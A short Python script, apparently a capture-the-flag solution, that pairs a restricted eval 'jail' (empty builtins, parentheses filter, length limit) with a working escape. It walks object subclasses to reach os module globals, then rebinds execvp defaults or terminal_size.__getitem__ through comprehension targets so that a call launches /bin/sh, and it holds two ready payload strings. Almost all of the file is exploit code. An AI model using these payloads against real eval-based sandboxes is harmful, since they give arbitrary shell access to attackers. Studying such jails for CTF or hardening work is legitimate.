def do(code):
    match = __import__("re").fullmatch(r'([^()]|\(\))*', code)
    if not match:
        print(f"womp womp")
        return
    print(eval(code, {"__builtins__": None}, {}) if __import__("re").fullmatch(r'([^()]|\(\))*', code) else ":(")
    if len(code) > 100:
        print("too long")
        return

if __name__ == "__main__":
    #print(().__class__.__base__.__subclasses__()[154])
    w =().__class__.__base__.__subclasses__()[154].__init__.__globals__
    print(w)
    print(w['system'])
    print(w['terminal_size'].__getitem__)
    print(w['execvp'].__defaults__)
    [1 for w['execvp'].__defaults__ in {'/bin/sh':['sh']}.items()]
    print(w['execvp'].__defaults__)

    payload = "[w:=().__class__.__base__.__subclasses__()[154].__init__.__globals__,[1 for w['terminal_size'].__getitem__ in [w['system']]],w['get_terminal_size']()['sh']]"
    print(len(payload))
    payload = "[w:=().__class__.__base__.__subclasses__()[154].__init__.__globals__,[1 for w['execvp'].__defaults__ in {'/bin/sh':['sh']}.items()],w['execvp']()]"
    print(len(payload))
    
    #do(payload)